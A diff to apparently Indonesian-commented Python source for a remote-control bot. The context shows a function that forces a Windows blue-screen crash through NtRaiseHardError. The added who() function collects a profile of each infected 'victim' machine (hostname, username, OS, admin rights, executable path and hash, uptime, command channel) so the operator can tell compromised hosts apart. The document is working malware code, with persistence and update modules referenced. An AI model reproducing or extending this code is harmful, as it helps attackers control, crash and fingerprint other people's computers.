@@ -814,3 +814,65 @@ def bsod():
     ntdll.NtRaiseHardError(ctypes.c_ulong(0xC0000420), 0, 0, None,
                            ctypes.c_ulong(6), ctypes.byref(resp))
     return "BSOD dikirim (kalau balasan ini sampai, privilege-nya kurang)"
+
+
+def _uptime_text(seconds):
+    """3600 -> '1h 0m'. Ringkas, karena who() dibaca di channel."""
+    seconds = int(seconds or 0)
+    days, rest = divmod(seconds, 86400)
+    hours, rest = divmod(rest, 3600)
+    minutes = rest // 60
+    if days:
+        return "%dh %dm" % (days * 24 + hours, minutes)
+    if hours:
+        return "%dh %dm" % (hours, minutes)
+    return "%dm %ds" % (minutes, rest % 60)
+
+
+def who(bot, state=None):
+    """Kartu identitas mesin ini, untuk membedakan korban yang lebih dari satu.
+
+    Yang paling penting di sini cuma dua baris: uuid8 dan sha8 build. Dengan
+    itu `!* who` langsung menjawab pertanyaan yang kemarin bikin bingung —
+    mesin mana yang membalas, dan build-nya yang mana.
+    """
+    import platform
+    import socket
+
+    from . import caps, config, persist, update
+
+    exe = None
+    try:
+        exe = persist.self_path()
+    except Exception:
+        exe = None
+
+    size = "?"
+    digest = "?"
+    if exe and os.path.isfile(exe):
+        try:
+            size = "%d B" % os.path.getsize(exe)
+            digest = update.sha256(exe)[:8]
+        except OSError:
+            pass
+
+    try:
+        host = socket.gethostname()
+    except Exception:
+        host = "?"
+
+    rows = [
+        "who    : %s   (uuid %s)" % (bot.uuid[:8], bot.uuid),
+        "host   : %s \\ %s" % (host, os.getenv("USERNAME", "?")),
+        "os     : %s %s %s   admin=%s" % (
+            platform.system(), platform.release(), platform.version(),
+            "yes" if caps.is_admin() else "no"),
+        "build  : %s   %s   sha %s" % (config.NAME, size, digest),
+        "exe    : %s" % (exe or "(tidak diketahui)"),
+        "proc   : pid %d   up %s" % (os.getpid(), _uptime_text(caps.uptime())),
+        "poll   : %.1fs   channel %s" % (
+            (state or {}).get("sleep", getattr(config, "POLL", 0)),
+            config.CHANNEL),
+        "alamat : !%s   !%s   !@%s" % (bot.alias, bot.uuid[:8], bot.host or "?"),
+    ]
+    return "\n".join(rows)
